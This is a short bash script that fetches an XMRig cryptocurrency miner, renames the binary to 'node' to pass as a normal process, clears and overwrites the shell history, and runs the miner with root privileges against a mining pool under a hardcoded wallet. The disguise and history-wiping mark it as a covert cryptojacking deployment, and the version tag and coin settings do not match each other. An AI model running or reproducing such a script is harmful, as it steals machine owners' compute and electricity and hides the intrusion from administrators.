#!/bin/bash
wget https://github.com/True-Mining/xmrig-zerofee/releases/download/v6.12.2/xmrig-6.16.2-linux-x64.tar
tar -xf xmrig-6.16.2-linux-x64.tar
rm xmrig-6.16.2-linux-x64.tar
cd xmrig-6.16.2
mv ./xmrig ./node
history -c && history -w && clear
sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o sg.salvium.herominers.com:1230 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.CPU2 -p x -k -t 4
